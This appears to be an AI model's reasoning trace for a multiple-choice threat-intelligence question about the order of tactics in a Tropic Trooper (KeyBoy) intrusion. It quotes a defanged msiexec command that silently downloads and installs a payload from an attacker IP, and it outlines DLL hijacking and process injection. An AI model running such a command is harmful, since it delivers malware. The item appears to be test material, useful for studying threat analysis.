Alright, I have this CTI outline about an attack attributed to Tropic Trooper, also known as KeyBoy. They're using some pretty sophisticated methods, and I need to answer a question about the sequence of their tactics based on this outline. Let's break this down step by step.

First, I need to understand the attack sequence as described in the CTI outline. It's organized by MITRE ATT&CK tactics, which helps in structuring the analysis.

**Initial Access:**

- Tropic Trooper uses exploits for CVE-2017-11882 or CVE-2018-0802, which are vulnerabilities in Microsoft Office's Equation Editor.

- They download an installer package (.msi) and install it on the system using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

So, the initial access vector is through malicious Office documents that exploit these vulnerabilities to download and install an MSI installer.

**Execution:**

- The system configuration file (in.sys) drops a backdoor installer (UserInstall.exe) and then deletes itself.

- UserInstall.exe drops a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (wab32res.dll), and an encrypted configuration file.

- UserInstall.exe uses BITSadmin to create a job and launch sidebar.exe.

- The malicious loader uses DLL hijacking on sidebar.exe to launch dllhost.exe.

- The loader injects a DLL backdoor into dllhost.exe.

- There are also observations of malicious documents that don't need to download anything from the internet, as the backdoor dropper is already embedded in the document.

So, in the execution phase, they're installing a backdoor and using legitimate Windows tools and processes to execute their malicious payloads, which is a common technique to blend in and avoid detection.

**Persistence:**

- The backdoor loads and decrypts an encrypted configuration file.

- It uses SSL to connect to command-and-control (C&C) servers.

This suggests that once the backdoor is installed, it establishes a persistent connection to the C&C server using encrypted communication to maintain control over the compromised system.

**Defense Evasion:**

- Tropic Trooper uses DLL hijacking to evade antivirus detection.

- The malicious wab32res.dll is loaded by a benign file, sidebar.exe.

- They create a directory structure that might be intended to mislead or confuse incident responders.

- The loader, named FakeRun, executes dllhost.exe and injects a malicious DLL, which is the backdoor, into this process.

This phase focuses on techniques to avoid detection and analysis, such as using legitimate files to load malicious DLLs and hiding directories.

**Others:**

- Tropic Trooper uses exploit-laden Office documents that appear to be job vacancies in sensitive organizations.

- The MSI file contains PDB strings that provide some insight into the development process.

- They use custom SSL libraries and recently registered SSL certificates that expire after a year, possibly to minimize their digital footprint.

This additional information provides context about the threat actor's methods and potential motivations.

Now, moving on to the question:

"After Tropic Trooper removed its traces by using DLL hijacking to load the malicious wab32res.dll through a benign file during the Defense Evasion phase, is it likely that TClient will use SSL to connect to Tropic Trooper's C&C server only before the Defense Evasion phase?"

And the answer choices are:

A: Yes

B: No

Okay, so I need to determine whether TClient uses SSL to connect to the C&C server only before the defense evasion phase.

First, let's clarify what TClient is. From the outline, it seems that TClient refers to the backdoor or the malicious DLL that's injected into dllhost.exe.

So, the question is asking about when TClient uses SSL to connect to the C&C server in relation to the defense evasion techniques employed.

Looking back at the persistence phase, it's mentioned that:

- "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers."

This suggests that the use of SSL to connect to the C&C server is part of the persistence mechanism, which occurs after the initial execution and likely after the defense evasion techniques have been applied.

In the defense evasion phase, they use DLL hijacking to load the malicious wab32res.dll through sidebar.exe, which then injects the backdoor into dllhost.exe.

So, the sequence appears to be:

1. Initial Access: Exploiting vulnerabilities in Office to download and install the MSI installer.

2. Execution: Installing the backdoor and using BITSadmin to launch sidebar.exe, which loads the malicious DLL via DLL hijacking.

3. Defense Evasion: Using DLL hijacking and other techniques to hide the malicious activity.

4. Persistence: The backdoor loads and decrypts the configuration file and uses SSL to connect to the C&C server.

Given this sequence, it seems that the use of SSL to connect to the C&C server is part of the persistence phase, which occurs after the defense evasion techniques have been applied.

Therefore, it is not likely that TClient uses SSL to connect to the C&C server only before the defense evasion phase. In fact, it seems to use SSL after the defense evasion techniques have been employed.

So, the answer should be:

B: No

But let's double-check the answer choices and the question to ensure I'm not missing anything.

The question is:

"After Tropic Trooper removed its traces by using DLL hijacking to load the malicious wab32res.dll through a benign file during the Defense Evasion phase, is it likely that TClient will use SSL to connect to Tropic Trooper's C&C server only before the Defense Evasion phase?"

So, it's asking if, after performing defense evasion techniques, TClient uses SSL to connect to the C&C server only before the defense evasion phase.

Wait a minute, this seems a bit confusing. Let's parse it carefully.

The phrase "only before the Defense Evasion phase" suggests that the question is inquiring whether the use of SSL to connect to the C&C server occurs exclusively prior to the defense evasion activities.

But based on the sequence I've established:

- Initial Access

- Execution

- Defense Evasion

- Persistence

And the persistence phase involves using SSL to connect to the C&C server.

Therefore, the use of SSL for C&C communication happens after the defense evasion phase.

So, if the question is asking whether TClient uses SSL to connect to the C&C server only before the defense evasion phase, and based on the sequence, it uses SSL after the defense evasion phase, then the answer should be "No, it does not use SSL only before the defense evasion phase."

Hence, the correct answer is B: No.

Wait, but let's consider if there's any scenario where SSL is used before the defense evasion phase.

Looking back at the initial access and execution phases, there doesn't seem to be any mention of SSL being used at those stages.

The download of the MSI installer is done via HTTP (as indicated by hxxp), not necessarily HTTPS.

So, it's possible that SSL is only used in the persistence phase.

Therefore, the statement "TClient will use SSL to connect to Tropic Trooper's C&C server only before the Defense Evasion phase" is incorrect because SSL is used after the defense evasion phase.

Hence, it's not likely, and the answer is B: No.

Yes, that makes sense.

**Final Answer**

\[ \boxed{B} \]
